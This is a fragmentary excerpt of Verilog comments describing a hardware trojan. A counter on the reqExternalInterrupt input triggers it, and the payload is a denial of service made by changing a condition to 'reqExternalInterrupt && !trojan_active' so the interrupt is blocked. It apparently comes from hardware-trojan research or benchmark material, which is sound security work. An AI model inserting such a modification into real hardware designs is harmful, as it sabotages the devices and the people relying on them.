 ...
 * 
 * Description:
 *   Disables operations by blocking reqExternalInterrupt control signal
 *   
 * Trigger: Counter on reqExternalInterrupt
 * Payload: Block reqExternalInterrupt when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block reqExternalInterrupt when trojan is active
//
// IMPORTANT: reqExternalInterrupt is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (reqExternalInterrupt && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: reqExternalInterrupt && 0 = 0 (always false)
//   All operations controlled by reqExternalInterrupt are blocked
